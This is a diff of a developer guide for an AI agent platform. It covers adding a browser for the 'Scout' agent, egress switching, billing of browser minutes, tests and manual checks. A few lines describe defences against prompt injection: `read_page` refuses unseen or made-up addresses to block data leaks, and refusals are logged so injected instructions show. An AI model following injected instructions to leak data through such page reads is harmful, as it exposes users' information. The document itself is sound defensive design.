 | RPC | Type | Purpose |
 |---|---|---|
-| CreateSandbox | unary | New container + volume + tokens (stays stopped); returns `mcp_token_hash` |
+| CreateSandbox | unary | New container + volume + tokens (stays stopped); carries `browser_enabled`; returns `mcp_token_hash` |
 | WakeSandbox | unary | Start if needed, wait for the Bridge; `RESOURCE_EXHAUSTED` at the cap |
 | Deliver | server stream | `ACCEPTED → WORKING… → TURN_DONE \| ERROR(platform_fault)` |
 | Touch | unary | Refresh last-active |
 | StopSandbox | unary | Polite stop, or `force` for stuck turns |
 | DeleteSandbox | unary | Remove container, volume, egress rules |
-| GetSandbox / ListSandboxes | unary | State, last active, memory |
+| GetSandbox / ListSandboxes | unary | State, last active, memory, the runtime, `browser_enabled` |
 | GetUsage | unary | Awake / browser seconds per user in a window |
 | SetEgressAllowlist | unary | Domains + the user's MCP servers |
 | SnapshotVolume | unary | Archive `/data` for backup |
@@ -1098,6 +1163,7 @@ The Telegram, WhatsApp and Sendblue webhooks answer 200 and save nothing while t
 | StartClaudeLogin | unary | Wake + start the Claude Code sign-in; returns Anthropic's authorize URL |
 | CompleteClaudeLogin | unary | Pass the user's code to the waiting sign-in (never stored); `connected` + a safe message |
 | ClaudeLogout | unary | Remove Claude Code's credentials from `/data` |
+| SetBrowser | unary | Scout's browser on or off for one user's container (2026-10-04). It takes effect on the next wake. The backend calls it from the `sync-browser` job and after a wake (§6.23) |
 
 ### 8.5 Bridge HTTP (vm-manager → container, port 8765, header `X-Bridge-Secret`)
 
@@ -1123,7 +1189,7 @@ All settings come from env vars, validated with Zod at startup (`src/shared/conf
 | Channels | `ENABLED_CHANNELS` (which channels are on; default `telegram,web`), `TELEGRAM_*`, `WHATSAPP_*` (incl. template names), `SENDBLUE_*`, `MEDIA_MAX_BYTES`, `ATTACHMENTS_DIR` |
 | Apps / routing | `COMPOSIO_API_KEY`, `COMPOSIO_WEBHOOK_SECRET`, `COMPOSIO_AUTH_CONFIGS` (JSON slug → auth config id), `JEV_URL`, `JEV_API_KEY`, `JEV_MODEL`, `JEV_TIMEOUT_MS` |
 | AI access | `AI_ACCESS_MODE` (`platform` default: Textcrew AI, Hermes on credits, when the user brings nothing · `own_only`: the user must add a key or connect their Claude plan) |
-| Crew | `CREW_AVAILABLE` (the specialists that are switched on: `byte,patch,scout` by default, or `none`) |
+| Crew | `CREW_AVAILABLE` (the specialists that are switched on: `byte,patch,scout` by default, or `none`), `BROWSER_AVAILABLE` (`true` once the deployed agent image has Scout's browser; default off: no container's browser is switched on and the apps show it as not available) |
 | Web search | `WEB_SEARCH_PROVIDER` (`brave`), `BRAVE_SEARCH_API_KEY` (unset: `web_search` says it isn't set up), `BRAVE_SEARCH_API_URL`, `WEB_SEARCH_COST_USD` (the cost a search is charged for, × 2.5; default 0.004, which is exactly 1 credit) |
 | Payments | `POLAR_ACCESS_TOKEN`, `POLAR_WEBHOOK_SECRET`, `POLAR_SERVER` (`sandbox` / `production`), `POLAR_PRODUCT_PRO/MAX/TOPUP_10`, `POLAR_WAITLIST_DISCOUNT_ID`, `FREE_CREDITS_MONTHLY_CAP` |
 | Ops | `BACKUP_DIR`, `BACKUP_VOLUMES_DIR`, `BACKUP_UPLOAD_CMD`, `BACKUP_KEEP_DAYS`, `METRICS_TOKEN`, `ALERT_WEBHOOK_URL`, `RATE_LIMIT_PER_IP_PER_MIN` |
@@ -1139,10 +1205,10 @@ vm-manager variables (see its `.env.example`): `DATABASE_URL`, `VM_INTERNAL_SECR
 | Harness | `test/global-setup.ts` starts one real Postgres (embedded binaries) and one `redis-server`; `test/setup.ts` gives each test file its own database (all migrations applied) and its own BullMQ key prefix. The global setup also keeps vitest's failure exit code: before 2026-10-03 an exit hook of the embedded Postgres ended the process with 0, so a failing `pnpm test` looked green to CI |
 | Contract | `expectContract(operationId, response, status)` validates every response body against `openapi.yaml`; a test fails if any spec operation isn't implemented |
 | Auth | Test Clerk JWTs signed with a generated RSA key (`CLERK_JWT_KEY`), real `verifyToken` |
-| Outside services | Swappable clients: `setVmClient` (a fake vm-manager whose "agent" calls the real `/mcp` with its token), `setTelegramApi`, `setWhatsappApi`, `setSendblueApi`, `setComposioApi`, `setLiteLLMClient`, `setPolarClient`, `setJevClient`, `setChatCompleter`, `setTranscriber`, `setUrlDownloader`, `setByokVerifier`, `setCommandRunner`, `setGitUpstream` (a fake GitHub), `setWebSearchProvider`, `setPageResolver` and `setPageTransport` (a fake internet for `read_page`) |
+| Outside services | Swappable clients: `setVmClient` (a fake vm-manager whose "agent" calls the real `/mcp` with its token; it keeps the browser switch per user, every `SetBrowser` and `WakeSandbox` call, and can be made to fail `SetBrowser` or `SetAgentRuntime`), `setTelegramApi`, `setWhatsappApi`, `setSendblueApi`, `setComposioApi`, `setLiteLLMClient`, `setPolarClient`, `setJevClient`, `setChatCompleter`, `setTranscriber`, `setUrlDownloader`, `setByokVerifier`, `setCommandRunner`, `setGitUpstream` (a fake GitHub), `setWebSearchProvider`, `setPageResolver` and `setPageTransport` (a fake internet for `read_page`) |
 | HTTP clients | `phase6-http-clients.test.ts` runs the real HTTP clients against a local stand-in server |
 | Concurrency | 50 parallel coupon redemptions on real Postgres; per-user lock overlap test; parallel sync-usage |
-| Files | `phase1-*` (skeleton), `phase3-*` (Telegram, web), `phase4-*` (approvals, apps), `phase5-*` (credits, usage, coupons, Polar, LiteLLM, jobs, API), `phase6-*` (WhatsApp, Sendblue, media, routing, clients), `phase7-*` (automations), `phase8-*` (hardening), `integration-billing`, `waitlist`, `waitlist-offer`, `claude-plan` (bring your own Claude plan), `git-gateway`, `dev-user-script`, and the launch basics: `channels-switch`, `app-action-charge`, `app-connections`, `telegram-no-purchase-links`, `infra-caddy` (the Caddyfile rule checked against the routes the api mounts), and the crew package: `crew`, `textcrew-ai-choice`, `pr-review`, `scout-tools`, and shared memory: `memory` (the tools, limits, secrets, per-user checks, the endpoints), `memory-turns` (the block and the recap in what is delivered) |
+| Files | `phase1-*` (skeleton), `phase3-*` (Telegram, web), `phase4-*` (approvals, apps), `phase5-*` (credits, usage, coupons, Polar, LiteLLM, jobs, API), `phase6-*` (WhatsApp, Sendblue, media, routing, clients), `phase7-*` (automations), `phase8-*` (hardening), `integration-billing`, `waitlist`, `waitlist-offer`, `claude-plan` (bring your own Claude plan), `git-gateway`, `dev-user-script`, and the launch basics: `channels-switch`, `app-action-charge`, `app-connections`, `telegram-no-purchase-links`, `infra-caddy` (the Caddyfile rule checked against the routes the api mounts), and the crew package: `crew`, `textcrew-ai-choice`, `pr-review`, `scout-tools`, and shared memory: `memory` (the tools, limits, secrets, per-user checks, the endpoints), `memory-turns` (the block and the recap in what is delivered), and Scout's browser: `browser` (who has it, the switch at creation, on a plan change through Polar's events and the job, after a wake, and no wake at zero credits); the browser's charging is in `phase5-usage`, `read_page` by engine in `scout-tools`, the crew list's `browser` in `crew`, and the new script commands in `dev-user-script` |
 | vm-manager | Unit tests with a fake Docker daemon and a fake clock; the store on embedded Postgres; the Bridge with a fake Hermes; `-tags=integration` tests for real Docker (not run yet) |
 
 Commands: `pnpm lint && pnpm typecheck && pnpm test` · `pnpm openapi:lint` · in `vm-manager/`: `go vet ./... && go test ./...`, Bridge: `python3 -m unittest discover -s tests -t .` (in `agent-image/`).
@@ -1202,7 +1268,18 @@ Commands: `pnpm lint && pnpm typecheck && pnpm test` · `pnpm openapi:lint` · i
 - **`read_page` opens only an address already seen for the user,** and redirects follow the same rule. This is stricter than the leak needs for redirects (a redirect's target is chosen by the site, not by the agent) and it costs some pages; it can be loosened to "same site" later.
 - **A refused `read_page` is written to the activity log,** so the user can see an injected instruction at work.
 - **Choosing Textcrew AI** is a preference next to the runtime, not a third runtime: the key and the Claude connection stay, so switching back needs no new sign-in.
-- **The browser is a proposal only** (HLD §11): a hosted browser driven by platform tools. Nothing is built. Decided 2026-10-04: it will allow logins, with the user signing in themselves and the agent never seeing the password (HLD §11.6 says what that needs: a view of the session to sign in through, and where the cookies live for each option).
+- **The browser is in the user's container, not at a hosted provider** (decided 2026-10-04, HLD §11). The proposal recommended a hosted browser driven by platform tools, to keep the container's network locked. The founder chose the container: no supplier, and no third party sees the pages. The cost is stated in HLD §10.3. Signing in to sites is the next step and is not built.
+
+**Scout's browser, the platform side, and `read_page` by engine (2026-10-04, `docs/launch-plan.md` W2c)**
+- **`BROWSER_AVAILABLE` also gates the switch,** not only what the apps show. With the setting off, no container is told to open, whatever the plan: the network is not opened for a browser the image doesn't have.
+- **The crew list keeps `available` and gains `enabled`.** The web app already treats `available` as "this deployment has it" and works out the plan itself. Making `available` depend on the user's plan would have told a Pro user the browser "isn't ready yet". So `available` is the setting and `enabled` is the setting and the plan.
+- **The switch is sent at three moments** (creation, plan change, after a wake). The third was added because a container made before the browser existed never sees a plan change, and a job can run out of tries.
+- **`setPlan` answers whether the plan changed,** so a renewal of the same plan queues nothing.
+- **A switch is written to the activity log,** so a user can see when their container was opened.
+- **`read_page` asks which engine the turn in progress runs on,** not what the user's settings say. The settings can change in the middle of a Hermes turn (the user connects their Claude plan), and a container can fail to switch; in both cases the agent that is running is Hermes. With no turn on record the strict rule applies.
+- **A page read at an unseen address is marked in the activity log** (`seen: false`), so reads under the open rule can be found.
+- **The dev script hides secrets in what it prints,** with the memory's secret patterns. A plain hash is left readable, so a review's commit id still shows.
+- **`test/infra-caddy.test.ts` checks the api's site only.** The web app's site (added to the Caddyfile the same day) has its own proxy, and the test had wanted exactly one.
 
 **Shared memory (2026-10-04, `docs/launch-plan.md` W3a)**
 - **The orchestrator owns memory,** not a new module: it builds what is delivered each turn, and the Platform MCP owns no tables.
@@ -1221,7 +1298,7 @@ Commands: `pnpm lint && pnpm typecheck && pnpm test` · `pnpm openapi:lint` · i
 - **The egress file is removed on every stop**, not only on delete.
 - **SetEgressAllowlist replaces both lists**; the backend sends the MCP domains itself.
 - **No `/data` disk quota** with Docker's default volume driver (set `SANDBOX_VOLUME_DRIVER/OPTS`).
-- **`browser_seconds` is always 0** (nothing records browser time yet). Browser use is planned for launch on the Max plan at 2 credits per minute (Scout drives a real browser). The crew package wrote a proposal (HLD §11); building it is package W2c and has not started. Logins will be allowed (HLD §11.6).
+- **`browser_seconds`** was always 0 until 2026-10-04. The browser package makes it real: the container reports the seconds the browser was open at the end of a turn, and each report is counted once (the `vm-manager` repo has the details). The backend charges it at 2 credits per minute (§6.23).
 - **Hermes's own approval prompts are denied**; the platform's `request_approval` is used instead.
 
 ---
@@ -1252,6 +1329,10 @@ Commands: `pnpm lint && pnpm typecheck && pnpm test` · `pnpm openapi:lint` · i
 | 19 | Scout's tool limit on Hermes (2026-10-04) | On Hermes the limit is an instruction, not a tool list. Check what a delegated Scout can call, and that `read_page` refuses a made-up address whoever calls it |
 | 20 | Shared memory on a real engine (2026-10-04) | On Hermes and on Claude Code: tell the agent a fact, see it in `GET /v1/memories`, and ask about it in a later turn. Check that the engine reads the block at the top of the message as notes, that it uses `remember` and not only its own memory, and how the block looks after the Bridge's own first line |
 | 21 | The recap on a real engine switch (2026-10-04) | Chat on Hermes, connect a Claude plan, send a follow-up that only makes sense with the earlier messages. Then switch back. The new engine carries on, and the same engine's next turn has no recap |
+| 22 | `read_page` on Claude Code after the built-in search (2026-10-04) | As a user on a Claude plan, ask for something Scout must search and read. Check that `read_page` now opens the results (`activity` shows `read_page`, not `read_page_refused`), and that a private address is still refused. On Hermes, check an unseen address is still refused |
+| 23 | The browser switch against the real vm-manager (2026-10-04) | Deploy both repos and the image with the browser, set `BROWSER_AVAILABLE=true`. `dev-user.ts browser --user <id>` for a Max user: `switched on`. Send a message after the container has stopped: Scout can use the browser. Set the plan to Pro and run it again: `switched off`, and after the next wake the container is locked again (`curl` to a public site from inside fails) |
+| 24 | Browser minutes on a real turn (2026-10-04) | After a turn that used the browser: `GET /v1/usage` shows `browserSeconds` and `browserCredits`, the credit history has `browser N`, and a second sync charges nothing more. Check when the vm-manager records the seconds against when the after-turn sync runs: seconds recorded after it are charged by the next 5-minute sync |
+| 25 | The dev script's `send` on the server (2026-10-04) | `dev-user.ts send --user <id> --text "…"` inside the api container: the worker runs the turn, and progress lines and the reply are printed. Then `messages`, `activity`, `approve`, `pr-review` and `memories` against real data |
 
 Most likely to break on the first real run:
 - Hermes config keys and its run API
@@ -1261,7 +1342,8 @@ Most likely to break on the first real run:
 - WhatsApp template setup (one body variable; approval template buttons in Approve, Reject order)
 - The Claude Code sign-in screen parsing in the pseudo-terminal, and the exact CLI flags of the pinned version
 - Composio's GitHub trigger payload and action names (pull-request review)
-- Pages that redirect to another path: `read_page` refuses those unless the target was seen
+- Pages that redirect to another path: on Hermes `read_page` refuses those unless the target was seen
+- The moment the vm-manager records browser seconds, against the after-turn usage sync and against a turn reversed as our fault
 - How each engine treats the memory block at the top of a message, and whether it saves with `remember` or with its own memory tool
 
 ---
@@ -1277,7 +1359,7 @@ beckend/
     auth/                     users, sessions, link codes, channel links, waitlist
     events/                   intake, queues, cleanup
     channels/                 adapters (telegram, whatsapp, sendblue, web), messages, outbound, SSE, media, files
-    orchestrator/             turn flow, process-message, Jev routing, approvals, sandbox tokens, lifecycle, gRPC client, lock, agent settings + Claude sign-in, the crew list, shared memory + the secret check, the memory block and the recap
+    orchestrator/             turn flow (and the engine of the turn in progress), process-message, Jev routing, approvals, sandbox tokens, lifecycle, gRPC client, lock, agent settings + Claude sign-in, the crew list, Scout's browser switch, shared memory + the secret check, the memory block and the recap
     platform-mcp/             MCP server + tools (core, apps, automations, web, memory), seen web addresses
     integrations/             Composio catalog/client/connections, user MCP servers, BYOK, git gateway, web page reader, web search
     billing/                  plans, credits/ledger, usage, app-action and paid-tool charges, LiteLLM, Polar, coupons, jobs
@@ -1288,7 +1370,7 @@ beckend/
   migrations/                 SQL migrations (drizzle-kit)
   proto-gen/                  generated gRPC client
   infra/                      docker-compose, Caddy, LiteLLM, Squid, egress test, Dockerfile
-  scripts/                    migrate, openapi-sync, restore-test, load-test
+  scripts/                    migrate, openapi-sync, restore-test, load-test, dev-user (a user, a turn and its traces from the command line)
   test/                       done-when tests per phase, plus one file per later feature
   docs/                       mvp-hld.md, deployment.md, security-checklist.md, this guide
 
